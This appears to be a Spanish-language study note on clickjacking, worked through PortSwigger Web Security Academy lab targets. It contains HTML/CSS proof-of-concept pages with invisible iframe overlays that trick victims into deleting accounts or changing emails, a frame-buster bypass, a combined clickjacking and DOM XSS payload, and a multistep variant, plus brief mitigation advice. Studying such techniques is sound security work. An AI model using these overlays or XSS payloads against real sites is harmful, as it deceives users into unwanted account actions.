# CLICKJACKING

## Table of contents

- [CLICKJACKING](#clickjacking)
  - [INTRODUCCION](#introduccion)
  - [POC](#poc)
  - [OTROS EJEMPLOS](#otros-ejemplos)
    - [BASIC CLICKJACKING](#basic-clickjacking)
    - [Clickjacking with form input data prefilled from a URL parameter](#clickjacking-with-form-input-data-prefilled-from-a-url-parameter)
    - [Clickjacking with a frame buster script](#clickjacking-with-a-frame-buster-script)
    - [CLICKJACKING + DOM-BASED XSS](#clickjacking--dom-based-xss)
    - [CLICKJACKING MULTISTEP](#clickjacking-multistep)
  - [MITIGACIONES](#mitigaciones)
  - [TOOLS](#tools)

## INTRODUCCION

**Clickjacking**, también conocido como "ataque de compensación de UI", es cuando un atacante usa varias capas transparentes u opacas para engañar a un usuario para que haga clic en un botón o enlace en otra página cuando intenta hacer clic en la página del nivel superior. Por lo tanto, el atacante está "secuestrando" los clics destinados a su página y enrutando a otra página, muy probablemente propiedad de otra aplicación, dominio o ambos.

Usando una técnica similar, las pulsaciones de teclas también pueden ser secuestradas. Con una combinación cuidadosamente elaborada de hojas de estilo, **iframes** y cuadros de texto, se puede hacer creer a un usuario que está escribiendo la contraseña en su correo electrónico o cuenta bancaria, pero en cambio está escribiendo en un marco invisible controlado por el atacante.

## POC

```html

<html>
	<head>
		<title>Clickjacking test page</title>
	</head>
	<body>
		<p>Website is vulnerable to clickjacking!</p>
		<iframe src="wwww.vulnerable.com/login" width="500" heigth="500"></iframe>
	</body>
</html>

```

Donde dentro del iframe debemos ajustar el:
- **src** con la pagina web a testear.
- **width** con el ancho de la pagina para mostrar.
- **height** con el alto de la pagina para mostrar.

## OTROS EJEMPLOS

### BASIC CLICKJACKING

- podemos jugar con un iframe para cargar la pagina vulnerable
- le agregamos una dimension con **height** y **width**
- jugamos con el opaciti para que no se pea la pagina, mas cerca a 0 sera invisible
- creamos un div
- lo posicionamos encima de un boton de la pagina vulnerable jugando con **top** y **left**
- cambiamos la opacidad a 0
- la victima presionara el div y en realidad esta presionando el boton de la pagina vulnerable

```html
<style>
	iframe {
		position:relative;
		width: 500px;
		height: 700px;
		opacity: 0.1;
		z-index: 2;
	}

	div {
		position:absolute;
		top:470px;
		left:60px;
		z-index: 1;
	}
</style>

<div>Click me</div>
<iframe src="https://vulnerable.com/"></iframe>
```

pagina vulnerable a clickjacking:

![[Pasted image 20220928162909.png]]

creando una poc para que el usuario presione el boton **Delete account**:

```bash
<style>
	iframe {
		position:relative;
		width: 500px;
		height: 700px;
		opacity: 0.1;
		z-index: 2;
	}

	div {
		position:absolute;
		top:500px;
		left:60px;
		z-index: 1;
	}
</style>

<div>Click me</div>
<iframe src="https://0a2400d203893863c04d9d7e004000ab.web-security-academy.net/my-account"></iframe>
```

![[Pasted image 20220928163047.png]]

cambiamos la opacidad `opacity: 0.0001` para que no se vea el iframe:

![[Pasted image 20220928163140.png]]

>[!info]
>El usuario victima tiene que estar logueado en la pagina vulnerable para que sus clicks tomen efecto.

>[!note]
>Puede que en nuestra PoC primero pongamos opacity en 1, iniciamos sesion y luego podemos calcular los botones.

### Clickjacking with form input data prefilled from a URL parameter

Puede que a traves de parametros GET podamos prellenar un formulario, por ejemplo a traves del parametro email podemos prellenar el valor del campo del formulario:

sin prellenado:

![[Pasted image 20230208211752.png]]

con prellenado:

![[Pasted image 20230208211836.png]]

>[!tip]
>No siempre nos mostrara estos parametros en la URL al cargar una pagina, hay que probar para adivinarlos.

asi solo toca hacer coincidir con el boton de actualizar email:

```bash
<style>
	iframe {
		position:relative;
		width: 500px;
		height: 700px;
		opacity: 0.1;
		z-index: 2;
	}

	div {
		position:absolute;
		top:450px;
		left:70px;
		z-index: 1;
	}
</style>

<div>Click me</div>
<iframe src="https://0a8f0014031efa4bce9063ff003200a5.web-security-academy.net/my-account?email=yei@yei.c"></iframe>
```

![[Pasted image 20230208212400.png]]

### Clickjacking with a frame buster script 

Puede que una aplicacion este protegida contra el secuestro de clics con un script de captura de marcos. Una vez que encuentra un marco (**\<iframe\>**) simplemento lo elimina.

si creamos una PoC basica vemos que no nos carga la pagina:

![[Pasted image 20230208213821.png]]

**_esto puede indicarnos que tiene una proteccion contra marcos (mas alla de headers de seguridad)_**

Para evadir la eliminacion de marcos (frame busting) podemos agregar el atributo `sandbox="allow-forms"` en la etiqueta meta:

```bash
<style>
	iframe {
		position:relative;
		width: 500px;
		height: 700px;
		opacity: 0.1;
		z-index: 2;
	}

	div {
		position:absolute;
		top:450px;
		left:70px;
		z-index: 1;
	}
</style>

<div>Click me</div>
<iframe src="https://0a8f0014031efa4bce9063ff003200a5.web-security-academy.net/my-account?email=yei@yei.c" sandbox="allow-forms"></iframe>
```

![[Pasted image 20230208214013.png]]

### CLICKJACKING + DOM-BASED XSS

La implementación de este ataque combinado es relativamente sencilla, suponiendo que el atacante haya identificado primero el exploit XSS. El exploit XSS luego se combina con la URL de destino del iframe para que el usuario haga clic en el botón o enlace y, en consecuencia, ejecute el ataque DOM XSS.

Si un campo de un formulario puede ser prellenado a traves de un paratro en la URL y este es vulnerable a XSS de algun tipo, podemos combinar el ataque de clickjacking con XSS para que al apretar el boton falso ejecute el XSS:

- El campo "**name**" es vulnerable a XSS 
- Wl boton "**Submit feedback**" activa el XSS

![[Pasted image 20230208214640.png]]

Es posible prellenar el formulario:

```bash
https://0a3c000d032aae40c007095800d700d8.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test
```

podemos crear la siguiente PoC donde prellenamos el campo **name** con un payload XSS y con el ataque clickjacking hacemos que el usuario active el payload XSS:

```bash
<style>
	iframe {
		position:relative;
		width:500px;
		height: 700px;
		opacity: 0.1;
		z-index: 2;
	}
	div {
		position:absolute;
		top:620;
		left:70;
		z-index: 1;
	}
</style>
<div>Click me</div>
<iframe
src="https://0a3c000d032aae40c007095800d700d8.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

![[Pasted image 20230208220026.png]]

>[!note]
>Colocamos `#feedbackResult` al final de la URL para que baje un poco el scroll y se acomo el boton de nuestra PoC.

![[Pasted image 20230208220007.png]]


### CLICKJACKING MULTISTEP

Puede que una pagina realice una accion y ademas pida confirmacion para realizarla (son 2 acciones)

![[Pasted image 20230208222514.png]]

![[Pasted image 20230208222535.png]]

podemos crear una PoC con varios botones y demas para que realice diferentes acciones:

```bash
<style>
	iframe {
		position:relative;
		width: 500px;
		height: 700px;
		opacity: 0.0001;
		z-index: 2;
	}

	#btn1 {
		position:absolute;
		top:500px;
		left:40px;
		z-index: 1;
	}
	#btn2{
		position:absolute;
		top:295px;
		left:200px;
		z-index: 1;
	}

</style>

<div id="btn1">Click me first</div>
<div id="btn2">Click me next</div>
<iframe src="https://0adc004e03ccee7bc1e38dc200f00037.web-security-academy.net/my-account"></iframe>
```

![[Pasted image 20230208222806.png]]

![[Pasted image 20230208222827.png]]

## MITIGACIONES

Si la cabecera **X-Frame-Option** esta configurada en la pagina web correctamente, entonces la pagina no deberia ser vulnerable a clickjacking.

- [https://javascript.info/clickjacking](https://javascript.info/clickjacking)

## TOOLS

[Jack](https://github.com/sensepost/jack)

Esta herramienta permite, mediante un drag and drop colocar elementos faslos a una pagina como muestra de clickjacking.

[demostracion](https://www.youtube.com/watch?v=xNZqaj7AZBA)

```bash
git clone https://github.com/sensepost/jack.git

cd jack

open "index.html" in the browser

Put the url and drad and drop the inputs fields
```